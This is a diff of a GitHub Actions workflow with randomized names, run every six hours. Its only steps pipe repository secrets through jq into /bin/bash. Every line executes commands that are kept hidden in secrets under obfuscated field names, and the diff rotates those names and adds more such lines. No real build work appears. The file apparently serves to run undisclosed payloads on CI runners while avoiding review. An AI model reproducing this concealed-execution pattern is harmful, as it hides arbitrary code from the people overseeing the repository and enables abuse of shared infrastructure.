@@ -2,22 +2,31 @@ name: liaifangxin1985
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 5/6 * * *'
+    - cron: '33 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: liaifangxin1985
         env:
-          sn5175: ${{ secrets.sn5175 }}
+          mgab70258: ${{ secrets.mgab70258 }}
         run: |
-          echo $sn5175 | jq -r .mi47456 | /bin/bash
-          echo $hqvny52 | jq -r .ckd7598 | /bin/bash
-          echo $hdac1577 | jq -r .zqi1841 | /bin/bash
-          echo $xgr65180 | jq -r .rcvu736 | /bin/bash
-          echo $mxy33 | jq -r .twzo75044 | /bin/bash
-          echo $njmko8379 | jq -r .f516 | /bin/bash
-          echo $qn99 | jq -r .ppgf92214 | /bin/bash
-          echo $lt886 | jq -r .zgkvo97822 | /bin/bash
+          echo $mgab70258 | jq -r .sxd60138 | /bin/bash
+          echo $elc47 | jq -r .oijb95273 | /bin/bash
+          echo $ua49 | jq -r .oo25126 | /bin/bash
+          echo $xdeh2 | jq -r .qvjx32620 | /bin/bash
+          echo $iegev3711 | jq -r .z956 | /bin/bash
+          echo $dt8 | jq -r .r360 | /bin/bash
+          echo $qzbf30653 | jq -r .vnx00480 | /bin/bash
+          echo $lbw5619 | jq -r .f624 | /bin/bash
+          echo $gio5905 | jq -r .hpuo5 | /bin/bash
+          echo $pqu97 | jq -r .ato3987 | /bin/bash
+          echo $ru4325 | jq -r .wuvl5 | /bin/bash
+          echo $uyro2877 | jq -r .qou15922 | /bin/bash
+          echo $bg606 | jq -r .kyn954 | /bin/bash
+          echo $gb5 | jq -r .twb7971 | /bin/bash
+          echo $nh00 | jq -r .bwvk2 | /bin/bash
+          echo $ewdo317 | jq -r .sjtlf1 | /bin/bash
 
